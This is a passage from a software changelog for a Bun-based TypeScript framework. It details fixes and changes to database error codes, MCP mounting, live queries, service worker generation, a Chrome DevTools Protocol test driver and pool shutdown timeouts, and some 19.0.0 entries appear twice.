  fix `x db gen "<what changed>" && x db migrate`; any other SQLSTATE is **`X_DB_STATEMENT_FAILED`**
  — the server answered, so it is not unavailable — and `X_DB_UNAVAILABLE` is now only what never
  reached a server, with the driver's own words in its cause (`ECONNREFUSED 127.0.0.1:5432`). The
  cause leads with `[SQLSTATE 42703] column "host_id" does not exist` and carries the statement
  after it, through `statementExcerpt`, so no column list can push the message off the line.
  Each mapping is tested through `createPgliteClient` with a PGlite-shaped error.

- **`extractKeys` read `t()` calls inside comments.** A `// … t('…', { … })` explaining the call
  below it was a usage, and `x i18n sync` would have written `"…": "⟦…⟧"` into every catalog for a
  string nobody renders. The extractor scans the comment-stripped text now; the mask keeps every
  newline and every string literal in place, so a `//` inside `t('http://…')` is still a key and
  every position still points at the source. The masking (`stripComments`, `maskLiterals`,
  `endOfLiteral`, `QUOTES`) moved from `@ultimat3/cli`'s `ts-scan.ts` to `@ultimat3/core`'s
  `source-mask.ts`, because `@ultimat3/i18n` is tier 1 and could not import tier 5 — one
  implementation, re-exported by `cli` under the names it had.

- **The framework never mounted an app's own MCP server.** `defineAppMcp({ …, resolveToken })`
  built `mcp.route`, `app.config.ts` declared `ai: { mcp: { expose: true, path: '/mcp' } }` by
  DEFAULT, the mcp README told authors to write `routes: [mcp.route]` into a config that has no
  such key — and neither `x dev` nor `runRole` mounted anything, so `POST /mcp` was
  `X_ROUTE_NOT_FOUND` in every app ever scaffolded, `examples/dummy` included. `x dev` also passed
  no app middleware at all (only the read-replica override), so an app could not mount it by hand.

  The contract is one file per concern. `apps/<app>/mcp.ts` exports `mcp` (an `AppMcp`); both
  boots go through `mountAppMcp()` (`packages/cli/src/app-mcp.ts`) and mount
  `POST config.ai.mcp.path` → `mcp.route.handle(request)` when `expose` is true, log
  `app mcp mounted`, and `x dev`'s summary prints `mcp POST /mcp`. The http route is
  `auth: 'public'`, `enforcedBy: 'handler'`: the bearer token is `resolveToken`'s to read, and a
  pipeline `auth: 'required'` would have demanded a session cookie an agent does not carry.
  `expose: true` with nothing to mount — no file exports `mcp`, or it was built without
  `resolveToken` and carries no `route` — logs **`X_MCP_APP_UNMOUNTED`** once per boot, with the
  file to write; `expose: false` mounts nothing and says nothing. Tested in both boots:
  `cmd-dev.test.ts` and `serve.live.test.ts` each assert `POST /mcp` is not a 404 (401 is the
  route's own verdict on a missing bearer).

  `apps/<app>/runtime.ts` exporting `runtime` (a `RuntimeOverrides`) is the same shape for
  middleware: `x dev` composes it exactly as `runRole` composes a caller's `runtime` — replica
  scope in front, the app's chain behind — and `runRole` reads the file when `apps/web/server.ts`
  passes none, resolved once at each public entry so `startServices`, the ISR and image seams and
  the middleware all see one object. The scaffolded `server.ts` never passed a `runtime`, so this
  is the first path by which an app's middleware reaches any process the framework boots.

- **Under `x dev` with the embedded database, live queries had no change feed.** The sync node is
  fed by Postgres logical replication — `x dev --role replicator` and a real `DATABASE_URL` — and
  PGlite has no walsender, so a subscription took its snapshot and then heard nothing: every
  `--live` query in every scaffolded app was dead in development, which is where an author first
  tries one. `packages/testing` already held the in-process bridge (`startLiveReplicator`, the row
  observer the framework's own live tests run on); `x dev` now installs it whenever the database
  is embedded (`packages/cli/src/dev-live-feed.ts`), and the ready line says which feed the node
  has: `live=in-process`, `live=replication` (a real database — the WAL decoder, here or in another
  process, and never a bridge beside it, which would deliver every write twice), or `live=none`
  (no `sync` role). `--json` carries it as `liveFeed`. Proven under a real boot
  (`dev-live-feed.test.ts`): embedded database, `web` and `sync` roles, a real `SyncSocket`
  subscription on the node's registry, one repository insert, one `patch` frame. The bridge's
  bound is unchanged and stated: a write another process makes is invisible, which holds by
  construction when every role runs in one process.

### Changed

- **CI pins Bun to the exact patch, `1.4.0`, not the series.** `1.4.x` admitted Bun 1.4.2 the
  morning it was published (2026-09-05, 05:55 UTC), and its bundler retains more of a re-export
  barrel than 1.4.0's: `packages/ui/src/barrel-bytes.test.ts` — three pins measuring what a
  browser chunk pays for the `@ultimat3/ui` barrel — fails on `main` under 1.4.2 with nothing
  changed (`<= 1024` bytes measured 10,653; `useUi` and `moneyText` retain 31 lines the module
  path does not) and passes under 1.4.0; `examples/dummy`'s like island grew from under 50,426
  bytes to 51,381 on the same runner. A patch that changes what ships to a browser is a change this
  repository measures, so `.github/actions/setup` and `release.yml` name the patch somebody
  measured, and `scripts/bun-pin.test.ts` accepts an exact patch beside a series (never `latest`).
  Moving forward is the 1.3 → 1.4 procedure: run the gate on the candidate, write the numbers.

- **A package boots the framework in-process in exactly one test file, and `cli`'s is
  `cmd-dev.test.ts`.** The coverage gate runs a package in one process, and a process has one
  lifecycle: the second in-process boot of `x dev` or `serveApp` is refused
  (`X_LIFECYCLE_DRAINED`, `X_READINESS_CHECK_DUPLICATE`), so with three boot files whichever one
  the filesystem listed first was measured and the rest failed in silence — `packages/cli` read
  94.94% on a GitHub runner and 95.73% on a laptop whose `readdir` listed the same files the other
  way round. `bun test --isolate` was measured and refused: Bun's lcov writer keeps one record per
  source under it, the last file's rather than the union (`packages/admin`: 92.04% isolated, 99.73%
  in one process, the same 578 tests passing both ways). So the fixture app moved into
  `cmd-dev-fixture.ts` — one declaration of `app.config.ts`, `mcp.ts`, `runtime.ts`, a memory-backed
  entity with a live query, the posts slice and the pricing page — and every assertion that needs
  a booted app lives in that one file's one boot (`web`, `sync`, `worker`, `scheduler`): the MCP
  mount, the app's middleware stamping every response, a live patch through a real `SyncSocket`.
  95.24% lines, on either order. Same cause one seam over: `eachSourceFile` yields each glob's
  matches SORTED now, because `Bun.Glob.scan` yields in `readdir` order and
  `X_WORKSPACE_DEP_UNDECLARED` named `index.ts` on one disk and `tools.ts` on another.

- **`budget.js` states its unit: raw minified bytes on disk, uncompressed.** `measureDocumentJs`
  always weighed `file.size`; the docs said "measured from the real bundle graph" and nothing said
  which bytes, so an app read "compressed" into it and could not see why a 350 kB library never
  fit a 120 kB budget. Raw is the right number — a budget bounds what the browser parses and
  executes, not what it transfers — so the unit is now written where the field is declared
  (`RouteBudget.js`), where the finding is worded (`X_BUDGET_EXCEEDED` says
  `(minified, uncompressed)`), in `wiki/Routes-And-Render-Modes.md` and the render README, and
  pinned by a test that weighs a 16 kB file which gzips below 2 kB at 16 kB.

- **`x g entity`'s tenant lines are documented in the output, and `--no-tenant` was refused.**
  `orgId` is decided on by `x g action`, `x g query`, `x g policy` and `x g job` as well, so a
  flag on the entity generator alone would leave `x g resource` emitting an action over a column
  its entity no longer has. The emitted `entity.ts` names the whole edit for a single-tenant app in
  the comment above `tenant: 'orgId'` — the two lines, the index, the repo's two `org_id` reads,
  and the two test expectations — and `wiki/CLI-Reference.md` says why there is no flag.

- **`@ultimat3/jobs`' README gains "Fan-out per row is a job, not a task".** `task.enqueue` stays
  synchronous — `describe()` reads `entries()` to project the task's job names into the manifest,
  and a task that reads a table in its tick is a task doing work — so "one job per row" is written
  as one fan-out job with one `step.run` per child, which is `webhook()`'s own shape. The rule was
  one sentence in `wiki/Scheduled-Tasks.md`; the pattern is now a compiled fence with all three
  files under a heading. Async `enqueue` was considered and refused for the two reasons above.

- **`wiki/Realtime.md` gains "Live query in the browser, end to end".** Four agents polled a query
  from an island because the five steps — the dependency (`x new` installs `@ultimat3/query` and
  not `@ultimat3/realtime`), the live query, the `ClientSocket` adapter, the sync URL as an island
  prop, `connect()` → `setLiveClient()` → `useLive()` inside an island — were each documented and
  nowhere in sequence. The section is the reference app's `feed.island.tsx`, condensed.

- **`wiki/Routes-And-Render-Modes.md` states that `stream` is not what a generator emits.** Its
  "Why `stream` is the app default" section described a design; `x g route` and `x new` both write
  `render: 'ssr'` on `app/` because `stream` needs a `<Suspense>` boundary the server JSX factory
  does not provide (`X_ROUTE_MODE_INVALID` without one). The section now leads with that status.

### Not changed, and the evidence for why

- **`defineRoles()` still accepts a grant nothing declared, and the gate is where that is refused.**
  A role map runs at module scope and the permission set may be declared by a later import
  (`@ultimat3/admin` declares `admin:*` on its barrel), so declaration time is not decidable; the
  earliest decidable point is the whole-program view, which `x verify`'s `policy` step has taken
  since 12.0.0 (`packages/cli/src/app-permissions.ts`, `X_PERMISSION_UNKNOWN` per undeclared grant
  or route requirement). The scaffold declares its grants (`scaffold-roles.ts`) and
  `scaffold-permissions.test.ts` pins every generated file to that rule. The app that reported this
  saw a green gate because its gate ran under the global CLI's empty registry — the first entry
  above — not because the step was missing.

- **`x g route` on `app/` emits `ssr`, and has since the boundary check landed.** `templates/route.ts`
  states the reason at the one place an author would change it, and
  `templates/emitted-routes.test.ts` puts every generated route through `assertModeInvariants`.
  The app's `dashboard/page.tsx` comment is the scaffold's own text; nothing in 19.0.0 emits
  `stream`.

- **No WebSocket upgrade on the `web` role, and no `x g route --surface api`.** `/api/*` is a
  projection of the action and query registries (`apiRoutes()`), `readSurface` refuses `api` by
  name, and the `web` role's `Bun.serve` is built with no `websocket` handler. An upgrade hook was
  refused rather than half-built: every stage of the http pipeline returns a `Response`, and an
  upgraded request must return `undefined` from `fetch` — a second exit with none of the pipeline's
  guarantees. `packages/http/README.md` documents the two halves an app writes instead (a realtime
  `channel` topic server→browser, an `action` browser→server) and the long-poll fallback.

### Commits

- fix: the fourteen frictions ai-maxxing hit, at the seam (#405)
- chore: commit .maintainer.yml so developerz.ai stops deferring every PR to CodeRabbit

## 19.0.0 - 2026-08-27

### Added

- **`x build`, `x dev` and the container emit a service worker — the half of the PWA story that
  had no build behind it.** `generateServiceWorker`, `buildPrecacheManifest`,
  `offlineFallbackSource`, `backgroundSyncSource` and `pushSource` had **zero callers** outside
  `@ultimat3/pwa` itself, so `pwa.offline`, `pwa.backgroundSync`, `pwa.push` and every route's own
  `offline:` field were declarations with no build behind them, and no Ultimate app had ever worked
  offline however its config was written (#390, following #362's manifest half).

  `packages/cli/src/sw-artifacts.ts` is the caller. It takes the route table (`describeRoutes()` —
  the same projection `x.manifest.json`, `/_x` and the sitemap are built from) plus the island
  bundle, and emits `sw.js` and `x-sw-register.js`. All three surfaces mount them: `x dev`, the
  container (`serve.ts`) and the static export (`prerender.ts`), which writes both as files because
  a static host runs no route table.

  **Registration is an EXTERNAL script, never inline.** `startWeb` computes a `script-src` sha256
  per inline script, so an unhashed one is blocked in the container while passing report-only under
  `x dev` — which is how the hydration runtime shipped broken once already.

  **`sw.js` is served `no-store` with `Service-Worker-Allowed: /`.** A cached `sw.js` is a worker
  that cannot be replaced; without the header the browser refuses to let a worker served from `/`
  control `/`, which `assertScope` cannot see because the scope a *registration* asks for has to be
  allowed by the script's own response.

  **`PrecacheManifest.warnings` has a reader**: `x build --target static --json` reports them under
  `serviceWorkerWarnings`, and the human table gets a `precache` row. The ceiling was, in
  `wiki/Troubleshooting.md`'s own words, "a designed thing that is not one".

- **A real browser proves it, which is why it could ship at all.** #390's fourth requirement was
  *"a real browser check that the emitted worker installs, activates and serves the fallback
  offline. Until it exists, do not ship the worker"* — a bad `sw.js` is sticky in a way a manifest
  is not. `packages/cli/e2e/service-worker.e2e.test.ts` registers the emitted file in a real
  Chrome, waits for it to take control, takes the network away and asserts that a runtime route
  with nothing cached renders the **offline document**. Both mutations were proved: dropping `app/`
  routes from the worker's table, and breaking the registration call, each take exactly one test
  down.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`E2eFixtures.offline()` did not take the SERVICE WORKER offline, so an offline assertion made
  on a PWA tested nothing.** Measured against the framework's own emitted `sw.js`: with the page
  session offline, a `networkFirst` route the cache had never seen still answered from the network,
  because a service worker fetches on its own CDP target and the condition was only ever set on the
  page's. The driver now auto-attaches worker targets
  (`Target.setAutoAttach { waitForDebuggerOnStart: false, flatten: true }`) and carries the
  condition onto each, including one that attaches *after* `offline(true)` — which is the ordinary
  case for a PWA. `cdpConnect().on()` is the subscription that makes it possible; `once()` cannot
  express "every occurrence, including the ones that have not happened yet".

- **`sw.js`'s own `regenerate:` header named a function call instead of a command**, because no
  command emitted the file. It says `x build` now, which is true.

- **`PWA_FIX` told the reader to write the spelling this release removed.** It is the `fix:` line on
  every `pwa` config finding, and it printed `offline: 'runtime'` — an instruction that now fails
  the validator it is printed by. It writes `offline: { fallback: '/offline' }` and says to add a
  route at that path, which is axiom 4's whole point.

- **`x build`'s worker findings are `serviceWorkerWarnings`, not `precacheWarnings`.** The list
  carries the push warning too, and a capability declared with nothing to wire it to is not a
  precache fact; the terminal row is labelled `service-worker` for the same reason. Renamed before
  it shipped, so no released report carries the old key.

### Changed

- **BREAKING — `pwa.offline` is a block, not a string.** It was
  `'precache' | 'runtime' | 'network-only'`: an app-wide DEFAULT for a field `defineRoute` makes
  **required** on every route (`route.ts` refuses a route without one), so it defaulted nothing,
  was read by nobody, and could not be given a reader without inventing a meaning for it.

  It is now `{ fallback, image, font, neverCache }`, and **`fallback` is required once
  `pwa.enabled` is true** — an absolute route path, screened at `defineConfig`. A relative one
  resolves against whatever document registered the worker, so `offline` served under `/posts/1` is
  `/posts/offline`: a 404 cached as the answer to every offline navigation. An installable app that
  shows the browser's error page offline is the failure the whole block exists to prevent, which is
  why this is required rather than optional — the alternative is two meanings for one switch.

  Migration, per app:

  ```ts
  // before
  pwa: { enabled: true, offline: 'runtime', name: 'My App', colors: { … } },
  // after
  pwa: { enabled: true, offline: { fallback: '/offline' }, name: 'My App', colors: { … } },
  ```

  and add a route at that path. `x new` scaffolds `apps/web/site/offline/page.tsx`; both tracked
  apps gained one. `AppConfigInput.pwa` is `PwaConfigInput`, which nests `offline` — `section`
  applies a patch one level deep, so a flat `Input<PwaConfig>` would have replaced the whole block
  and left `image`, `font` and `neverCache` absent at run time while the type said otherwise.

- **BREAKING — `x new` writes `apps/web/site/offline/page.tsx`, not `apps/web/app/offline.tsx`.**
  The old path shipped a component exporting `OfflineFallback` that no module imported and no route
  table carried: `<name>.tsx` is not a route file, so `/offline` was never a URL. Same edit in
  `dummy/social-media-clone`, which had the identical orphan. `site/` and `render: 'static'`
  deliberately — the document that answers a lost network must render with no network, no session
  and no database, which `app/` (`ssr | stream`) cannot promise.

- `StaticReport` gains `serviceWorkerWarnings`. A report written before the field existed reads as none
  rather than as unparseable, for the reason `unmeasured` already earned one field earlier.

- **A real browser behind `installE2eDriver`, over raw CDP, with no dependency.** `PageLike` has
  been declared since 1.0.0 and `installE2eDriver({ page })` has taken an `E2eBrowserPage` since
  the adapter landed — and nothing in the tree could produce one, so `hasE2eDriver()` answered
  `false` everywhere and every `e2eTest` was a skip. Issue #390's fourth requirement is a real
  browser check, and it was recorded as out of reach on two premises that were both false:
  `packages/cli/CLAUDE.md` said "CI has no Chrome" (GitHub-hosted `ubuntu-latest` ships one at
  `/usr/bin/google-chrome`) and a browser was assumed to mean a `puppeteer-core` dependency.

  `E2eBrowserPage` is **five methods**, and CDP's wire format is one JSON object with an `id` — so
  the browser half is four modules on Bun's own `WebSocket`: `cdp-launch.ts` (find a Chrome, start
  it, read its endpoint off **stderr**, which is the only place `--remote-debugging-port=0` states
  the port it took), `cdp-connection.ts` (framing, correlation by `id`, one-shot event waiters, a
  per-call deadline), `cdp-e2e-page.ts` (the five methods over a flattened session) and
  `cdp-browser.ts` (the composition, and the close that undoes both halves).
  `packages/cli/e2e/cdp-browser.e2e.test.ts` drives a real Chrome against a real `Bun.serve` and
  asserts every one of them.

  **`openE2eBrowserIfAvailable()` answers `undefined` when there is no browser**, so a laptop
  without Chrome SKIPS rather than turning the `e2e` step red for a reason unrelated to the change;
  `openE2eBrowser()` refuses by name for a caller that has already decided it needs one.

  **The load EVENT is the completion signal, never `Page.navigate`'s reply.** Measured on Chrome
  150: a navigation that swaps the render process — `about:blank` → `http://localhost:<port>/`,
  the most ordinary one there is — loads the page, hits the server, and answers a later
  `Runtime.evaluate` from the new document, while the navigate frame never comes back at all. The
  first draft awaited it and hung for its full deadline on every first navigation. The reply is now
  raced against a `Page.loadEventFired` waiter registered before the send, and is still read for
  `errorText` — the one place a refused navigation is named, and the only signal an unreachable
  host produces.

  Four new codes, because they are four repairs: `X_CDP_BROWSER_MISSING`, `X_CDP_LAUNCH_FAILED`,
  `X_CDP_CALL_FAILED`, `X_CDP_TIMEOUT`.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **Every `sideEffects` array in the tree was inert, and a shipped island was missing five declared
  effects.** `bun run side-effects` is a ratchet that moved 30 packages onto an honest `sideEffects`
  array, and its own header stated the premise: *"a lie here is silent — Bun honours the field"*.
  Bun does not. It reads any `sideEffects` **array** as if it were `false` and shakes the named
  module away regardless — reduced to four files with no `@ultimat3/*`, deterministic on 1.4.0,
  1.4.1-canary and 1.3.14 alike, where esbuild keeps it on the same input. Filed as
  [oven-sh/bun#40650](https://github.com/oven-sh/bun/issues/40650).

  Measured on `examples/dummy`'s `feed.island.tsx`, unminified so Bun's per-module banners survive:
  `@ultimat3/core`'s `context.ts`, `lifecycle-errors.ts` and `secrets-errors.ts`,
  `@ultimat3/query`'s `registry.ts` and `@ultimat3/i18n`'s `errors.ts` were all absent from the
  chunk. The one that mattered is the one that was there by luck — `core/schema-error-codes.ts`,
  which registers **`@ultimat3/schema`'s** error titles because schema is tier 0 and cannot register
  its own. What reads them is `UltimateError`'s constructor, which never imports it, so a build that
  shook it out rendered every `X_VALIDATION_FAILED` untitled in the browser with nothing to say why.

  **A bare `import './schema-error-codes';` is the form that holds** — a statement rather than a
  binding, so no shaker has a reason to drop it, on any bundler. The array **stays**: rollup, webpack
  and esbuild do honour it and `@ultimat3/*` are packages other people bundle, so this is additive
  and costs those consumers nothing. `SIDE_EFFECTS_ANCHORS` is the enforced table —
  `X_SIDE_EFFECTS_UNANCHORED` for a listed module no entry imports bare,
  `X_SIDE_EFFECTS_ANCHOR_STALE` for a row nothing declares.

  **A list and not a predicate, and both predicates that were tried are why.** "Anchor every
  declared module" put `core/context.ts` in every browser chunk — **+3,485 B** for
  `setLoggerContextFields`, whose provider can only answer where a request context exists and which
  in a browser can never fire at all — and took `like.island.tsx` **over its route's declared 50 kB
  budget**. "Anchor every `register*` call" put `@ultimat3/ui`'s `errors.ts` on the barrel, dragging
  core's error registry (~5.6 kB) into every chunk importing any `@ultimat3/ui` name, which is the
  exact regression `packages/ui/src/barrel-bytes.test.ts` exists to catch. The discriminator neither
  could see: a package's own `errors.ts` registers titles for errors whose **constructors live in
  that same file**, so importing the constructor imports the registration — anchored by use, and an
  anchor there is pure weight. Three modules register on behalf of a module that does not import
  them, and only those three are listed.

  The price, measured rather than assumed: **0 B** on all four of `examples/dummy`'s islands. And
  retention became **deterministic** — the `schema-error-codes.ts` flap that
  `island-bytes.test.ts` and `barrel-bytes.test.ts` both work around
  ([#354](https://github.com/developerz-ai/ultimate/issues/354)) went from 12 flaps in 60 pairs on
  1.4.0 and 28 in 60 on 1.3.14 to **0 in 60 on 1.4.0, 1.3.14 and 1.4.1-canary alike**.

  Backed by the test that would have caught it: every other rule here reasons about the
  *declaration*, so the new one **bundles a consumer entry for the browser and looks** — asserting
  the module is in the chunk when the entry imports only `uuid`, which reaches it through nothing,
  and asserting the three unanchored ones are **not** dragged in. Mutation-proved in both
  directions. `scripts/side-effects.ts` split at the 500-line ceiling along the seam it already
  drew: `scripts/lib/side-effects-scan.ts` gathers the facts, the script judges them.

- **A pool shutdown that could never finish, and the release that could never be handed back.**
  `PostgresClient.close()` awaited a bare `pool.close()`, and `Bun.SQL`'s `end()` waits on an
  outstanding RESERVED connection **without ever giving up**. Measured against a real server, three
  runs per case: it never returns — on Bun 1.3.14 **and** on 1.4.0, with the database perfectly
  healthy. `@ultimat3/cli`'s `releaseQueue` awaits that method, so a role whose database went away
  mid-shutdown never finished shutting down; a container that will not drain is drained by SIGKILL,
  and the operator's only signal is a pod that took its whole termination grace period. This was
  filed as a Bun 1.3 defect ([#394](https://github.com/developerz-ai/ultimate/issues/394)) and the
  filing was wrong: 1.4.0 was not correct here, it was lucky — with the connection's backend
  terminated the hang is a race 1.3.14 loses 3 times of 3 and 1.4.0 loses 1 time of 3.

  The capability was already in the seam and passed by nobody: `BunSqlDriver.close` has declared
  `{ timeout }` since this package's `Bun.SQL` slice was written — the same shape as
  `setOfflineMode` on the CDP port, one entry above. `PoolProfile` gains `drainTimeoutMs` (`web`
  and `sync` 5s, `worker` 15s, `scheduler` 5s; `migrate` and `replicator` **0**, which still waits
  forever, deliberately — a run-once role cutting off its own session mid-statement is worse than a
  slow exit) and `close()` passes it. **The unit is seconds**: `timeout: 5000` would be an
  eighty-three minute budget, which is the same hang with extra steps.

  A drain that used its whole budget raises the new `X_DB_DRAIN_TIMEOUT`, because the driver
  **resolves** when it gives up rather than rejecting — an abandoned drain looked exactly like a
  clean one, and the work still in flight was lost with no line anywhere saying so. That verdict is
  measured with `performance.now()` and never `Date.now()`, and the reason is this repo rather than
  NTP: the framework preload freezes `Date` for every test in the tree, so a duration off
  `Date.now()` is 0 in all of them and the branch could not have fired.

  Bounding the close is what made the second half reachable, and the second half is the worse one.
  `BunSqlReserved.release()` was typed `void` and **answers a promise**, which on 1.3.14 REJECTS
  with `ERR_POSTGRES_CONNECTION_CLOSED` once the pool has closed — floated by both callers, so it
  surfaced as an unhandled rejection, which Bun takes the process down for. And `release()` is
  `DbConnection[Symbol.dispose]`, so a throw there replaces whatever error reached the `using`
  block. `releaseReserved()` (`bun-sql.ts`) is now the one way a pin goes back — `client.ts` and
  `pool-reserve.ts` both route through it — and it handles the sync throw and the rejected promise
  alike, reporting `db.release_failed` at debug rather than swallowing silently.

  Pinned both ways: `pool-drain.test.ts` asserts what `close()` **asks** the driver for, against a
  fake pool, and `pool-drain.live.test.ts` asserts a real server's driver honours it — a fake's
  `close()` is whatever the fake decided, and the finding is about the real one. Both are
  mutation-proved, including against a real Postgres, where deleting the bound reproduces the hang.
  `dev-runtime.live.test.ts`, the suite this was found in, now passes on **both** runtimes with no
  flags; its `afterEach` gained an explicit budget, because Bun's 5000ms hook default was racing
  `web`'s own 5000ms drain.

- **`E2eFixtures.offline()` and `online()` forward to the browser instead of refusing, and the
  reason they refused was never true.** `packages/cli/src/e2e-driver.ts` said `CdpPageLike`
  "declares twelve methods and none of them is `setOfflineMode`". It declares it at
  `packages/scraping/src/cdp-port.ts:71` — optional, with a coded `X_NOT_IMPLEMENTED` in
  `cdp-target.ts` for a launcher that lacks it — and `page-over-target.ts` exposes it as
  `ScrapePage.offline()`. All of that landed in **the same commit as the comment** (#351), so the
  refusal was wrong on the day it was written, and [#390](https://github.com/developerz-ai/ultimate/issues/390)
  records a real browser check for the service worker as out of reach because of it.

  `E2eBrowserPage` gains an optional `offline(enabled)`, matching how `CdpPageLike` declares the
  same method: the port is the shape of somebody else's object, and a six-line double must still
  satisfy it. Absent, the fixture still REFUSES rather than no-opping — an `offline()` that did
  nothing would let the app's ONLINE page pass an offline test — but it now names the method the
  double is missing instead of sending the reader after a capability the framework already has.
  `update()` still refuses on its own merits: a new build id is a fact about the server, which no
  page port can speak for. Proved by mutation on both the forward and the refusal.

- **A gate rule that scanned zero files on Bun 1.3 and reported green.** `Bun.Glob` on 1.3.14
  matches nothing under a dot-directory unless the scan asks for `dot: true` — even when the
  pattern spells the dot itself — where 1.4.0 matches either way. Measured on this tree:
  `.github/workflows/*.yml` selects **0** files on 1.3.14 and **5** on 1.4.0. `STEP_GLOBS` names
  that glob and a deep `.claude` one precisely because a workflow and an agent brief each state the
  gate's step count, so on Bun 1.3 `bun run gate-steps` never read either and passed. Not a wrong
  answer — a question never asked, with the runtime as the only thing closing the hole. The shared
  `readMarkdown` now passes `dot: true` unconditionally, which fixes it for all four scanners that
  share it (`gate-steps`, `doc-commands`, `release-facts`, `version-stamp-scan`). A scan whose
  corpus depends on the Bun minor is the defect; the pin is one line and moves.

  The behavioural test cannot catch this on Bun 1.4 — it passes there either way — so
  `gate-steps.test.ts` also reads the OPTION off the `scan` call, which reds on both runtimes.
  Proved by mutation.

- **`mountIsland` built every island in the app to mount one.** `island-bundle.ts` added its `only`
  option for exactly this caller — "a test that mounts a single island otherwise pays every OTHER
  island's Babel pass and `Bun.build` on every file, and the reference app is the one that feels
  it" — and nothing ever passed it. `IslandBuilder` gains an optional second parameter, so a builder
  of your own written as `(root) => …` is still assignable and `buildIslands` already satisfies it.

- **21 gate tests that only passed on the fastest Bun anyone had run them on.** `REPO_SCAN_TIMEOUT_MS`
